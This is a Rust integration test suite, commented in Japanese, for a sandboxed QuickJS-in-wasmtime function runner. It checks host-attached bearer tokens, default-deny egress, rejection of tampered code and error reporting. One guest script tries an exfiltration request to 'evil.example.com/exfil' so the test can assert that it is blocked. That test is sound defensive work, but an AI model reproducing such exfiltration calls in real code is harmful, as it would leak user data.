//! B2 関数実行の結合テスト（Task 9.12 受け入れ条件）。
//!
//! 実 QuickJS-in-wasmtime（埋め込みゲスト wasm）＋モックゲートウェイ（ループバック axum）で:
//! - 関数がサンドボックス内で起動・実行・破棄され、能力呼び出しがゲートウェイ HTTP に
//!   **ホスト付与の Bearer** で届く（ゲストは token を知らない）
//! - egress が default-deny（allowlist 外は `egress_denied`・allowlist 内のみ許可）
//! - サーバコードの content address 不一致は実行拒否

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::sync::{Arc, Mutex};

use app_platform::{FunctionActor, FunctionInvocation, FunctionRunner};
use axum::{
    extract::State,
    http::StatusCode,
    routing::{get, post},
    Json, Router,
};
use script_runtime::ScriptEngine;
use storage::content_address::{miniapp_bundle_key, sha256_hex};
use uuid::Uuid;

#[path = "support/mem_store.rs"]
mod mem_store;
use mem_store::MemStore;

/// モックゲートウェイ: /gw/data/tables を返し、受信 Authorization を記録する。
#[derive(Clone, Default)]
struct MockGateway {
    auth_seen: Arc<Mutex<Vec<String>>>,
}

async fn mock_tables(
    State(gw): State<MockGateway>,
    headers: axum::http::HeaderMap,
) -> Json<serde_json::Value> {
    gw.auth_seen.lock().unwrap().push(
        headers
            .get("authorization")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string(),
    );
    Json(serde_json::json!([{ "id": "t-1", "name": "expense" }]))
}

const SCRIPT: &str = r#"
function main(input) {
  var tables = Shiki.data.listTables();
  Shiki.log.info("tables fetched");
  var egress;
  try {
    Shiki.http.request({ url: "http://evil.example.com/exfil" });
    egress = "allowed";
  } catch (e) {
    egress = e.code;
  }
  return { fn: input.function, actor: input.actor, tables: tables, egress: egress };
}
"#;

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn function_runs_in_sandbox_with_host_attached_bearer_and_egress_deny() {
    // モックゲートウェイをループバックで起動。
    let gw = MockGateway::default();
    let app = Router::new()
        .route("/gw/data/tables", get(mock_tables))
        .with_state(gw.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });

    // サーバコードを content address で配置。
    let tenant = format!("t-{}", Uuid::new_v4());
    let sha = sha256_hex(SCRIPT.as_bytes());
    let store = Arc::new(MemStore::default());
    store.0.lock().unwrap().insert(
        miniapp_bundle_key(&tenant, &sha),
        SCRIPT.as_bytes().to_vec(),
    );

    let engine = Arc::new(ScriptEngine::new().expect("engine"));
    let runner = FunctionRunner::new(engine, store.clone(), format!("http://{addr}")).unwrap();

    let outcome = runner
        .run(
            &sha,
            FunctionInvocation {
                tenant_id: tenant.clone(),
                app_id: Uuid::new_v4(),
                function: "on_approved".into(),
                payload: serde_json::json!({ "record": "r1" }),
                bearer: "test-service-token".into(),
                actor: FunctionActor::Service,
                egress_allowlist: vec!["api.partner.example".into()],
            },
        )
        .await
        .expect("run");
    assert!(outcome.ok, "{outcome:?}");
    let v = &outcome.value;
    assert_eq!(v["fn"], "on_approved");
    assert_eq!(v["actor"], "service");
    assert_eq!(v["tables"][0]["name"], "expense");
    // egress default-deny: allowlist 外は egress_denied コードで拒否される。
    assert_eq!(v["egress"], "egress_denied");
    // ゲートウェイに届いた Bearer は**ホストが付与**したもの（ゲスト由来ではない）。
    let seen = gw.auth_seen.lock().unwrap().clone();
    assert_eq!(seen, vec!["Bearer test-service-token".to_string()]);
    // ログはホスト側に集約される。
    assert!(
        outcome.logs.iter().any(|l| l.contains("tables fetched")),
        "{:?}",
        outcome.logs
    );
}

/// data.* / notify.send / rag.search の各能力がゲートウェイ HTTP に正しいメソッド・パスで
/// 届き、ゲートウェイの 4xx が ShikiError（`http_<code>`）としてゲストに伝わることを検証する。
const CAP_SCRIPT: &str = r#"
function main(input) {
  var tid = "11111111-1111-1111-1111-111111111111";
  var rid = "22222222-2222-2222-2222-222222222222";
  var q = Shiki.data.query(tid, { filter: {} });
  var g = Shiki.data.get(tid, rid);
  var c = Shiki.data.create(tid, { amount: 1 });
  var u = Shiki.data.update(tid, rid, { amount: 2 }, 1);
  Shiki.notify.send("u1", "hello", "body");
  var denied;
  try {
    Shiki.data.get(tid, "33333333-3333-3333-3333-333333333333");
    denied = "unexpected-ok";
  } catch (e) {
    denied = e.code;
  }
  return { q: q.rows, created: c.id, updated: u.rev, denied: denied };
}
"#;

async fn cap_query(
    axum::extract::Path(_t): axum::extract::Path<String>,
) -> Json<serde_json::Value> {
    Json(serde_json::json!({ "rows": [{ "id": "r1" }] }))
}

async fn cap_get(
    axum::extract::Path((_t, id)): axum::extract::Path<(String, String)>,
) -> Result<Json<serde_json::Value>, (StatusCode, Json<serde_json::Value>)> {
    // 不可視レコードは 404（存在秘匿・ゲートウェイの二重ゲート相当）。
    if id.starts_with("3333") {
        return Err((
            StatusCode::NOT_FOUND,
            Json(serde_json::json!({ "error": "not found" })),
        ));
    }
    Ok(Json(serde_json::json!({ "id": id })))
}

async fn cap_create(
    axum::extract::Path(_t): axum::extract::Path<String>,
) -> Json<serde_json::Value> {
    Json(serde_json::json!({ "id": "created-1" }))
}

async fn cap_update(
    axum::extract::Path((_t, _id)): axum::extract::Path<(String, String)>,
) -> Json<serde_json::Value> {
    Json(serde_json::json!({ "rev": 2 }))
}

async fn cap_notify() -> Json<serde_json::Value> {
    Json(serde_json::json!({ "delivered": true }))
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn capabilities_delegate_to_gateway_with_method_and_error_mapping() {
    let app = Router::new()
        .route("/gw/data/tables/{t}/query", post(cap_query))
        .route(
            "/gw/data/tables/{t}/records/{id}",
            get(cap_get).patch(cap_update),
        )
        .route("/gw/data/tables/{t}/records", post(cap_create))
        .route("/gw/notify/send", post(cap_notify));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });

    let tenant = format!("t-{}", Uuid::new_v4());
    let sha = sha256_hex(CAP_SCRIPT.as_bytes());
    let store = Arc::new(MemStore::default());
    store.0.lock().unwrap().insert(
        miniapp_bundle_key(&tenant, &sha),
        CAP_SCRIPT.as_bytes().to_vec(),
    );
    let engine = Arc::new(ScriptEngine::new().expect("engine"));
    let runner = FunctionRunner::new(engine, store, format!("http://{addr}")).unwrap();

    let outcome = runner
        .run(
            &sha,
            FunctionInvocation {
                tenant_id: tenant,
                app_id: Uuid::new_v4(),
                function: "caps".into(),
                payload: serde_json::Value::Null,
                bearer: "svc".into(),
                actor: FunctionActor::User,
                egress_allowlist: vec![],
            },
        )
        .await
        .expect("run");
    assert!(outcome.ok, "{outcome:?}");
    let v = &outcome.value;
    assert_eq!(v["q"][0]["id"], "r1");
    assert_eq!(v["created"], "created-1");
    assert_eq!(v["updated"], 2);
    // ゲートウェイ 404 は http_404 コードの ShikiError としてゲストに伝わる。
    assert_eq!(v["denied"], "http_404");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn tampered_code_is_rejected() {
    let tenant = format!("t-{}", Uuid::new_v4());
    let sha = sha256_hex(SCRIPT.as_bytes());
    let store = Arc::new(MemStore::default());
    // content address と異なる内容（改竄）を置く。
    store.0.lock().unwrap().insert(
        miniapp_bundle_key(&tenant, &sha),
        b"function main(){}".to_vec(),
    );
    let engine = Arc::new(ScriptEngine::new().expect("engine"));
    let runner = FunctionRunner::new(engine, store, "http://127.0.0.1:1".into()).unwrap();
    let err = runner
        .run(
            &sha,
            FunctionInvocation {
                tenant_id: tenant,
                app_id: Uuid::new_v4(),
                function: "f".into(),
                payload: serde_json::Value::Null,
                bearer: "t".into(),
                actor: FunctionActor::User,
                egress_allowlist: vec![],
            },
        )
        .await;
    assert!(err.is_err(), "{err:?}");
}

/// 捕まえずに投げた誤りとゲートウェイの断りは、失敗の理由（code）と文として呼び出し側へ返る。スタックの行と内部の文は
/// 返さない（GAP-60）。
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn failures_return_code_and_message_without_stack() {
    let app = Router::new().route(
        "/gw/data/tables/{t}/records/{id}",
        get(|| async {
            (
                StatusCode::FORBIDDEN,
                Json(serde_json::json!({ "error": "権限がありません: この操作は許可されていません" })),
            )
        }),
    );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let engine = Arc::new(ScriptEngine::new().expect("engine"));
    let run = |script: &'static str| {
        let engine = Arc::clone(&engine);
        async move {
            let tenant = format!("t-{}", Uuid::new_v4());
            let sha = sha256_hex(script.as_bytes());
            let store = Arc::new(MemStore::default());
            store.0.lock().unwrap().insert(
                miniapp_bundle_key(&tenant, &sha),
                script.as_bytes().to_vec(),
            );
            FunctionRunner::new(engine, store, format!("http://{addr}"))
                .unwrap()
                .run(
                    &sha,
                    FunctionInvocation {
                        tenant_id: tenant,
                        app_id: Uuid::new_v4(),
                        function: "f".into(),
                        payload: serde_json::Value::Null,
                        bearer: "t".into(),
                        actor: FunctionActor::User,
                        egress_allowlist: vec![],
                    },
                )
                .await
                .expect("run")
        }
    };

    // 作成者が投げた誤り: 文の最初の行（スタックの行は返さない）。
    let thrown = run(
        r#"function main(input) { if (!input.payload) { throw new Error("金額が空です"); } return 1; }"#,
    )
    .await;
    assert!(!thrown.ok);
    let error = thrown.error.as_ref().expect("error");
    assert_eq!(error.code, "script_error");
    assert_eq!(error.message, "金額が空です");
    assert!(!error.retryable);
    let body = serde_json::to_value(&thrown).unwrap();
    assert_eq!(body["error"]["code"], "script_error");
    assert!(!body.to_string().contains("eval_script"), "{body}");

    // 捕まえずに投げ返したゲートウェイの断り: その code と文。
    let denied = run(r#"function main(input) {
  Shiki.data.get("11111111-1111-1111-1111-111111111111", "22222222-2222-2222-2222-222222222222");
  return 1;
}"#)
    .await;
    let error = denied.error.as_ref().expect("error");
    assert_eq!(error.code, "http_403");
    assert_eq!(
        error.message,
        "権限がありません: この操作は許可されていません"
    );

    // 成功したときは error を返さない（これまでの応答の形のまま）。
    let ok = run("function main(input) { return { done: true }; }").await;
    assert!(ok.ok && ok.error.is_none());
    assert!(serde_json::to_value(&ok).unwrap().get("error").is_none());
}
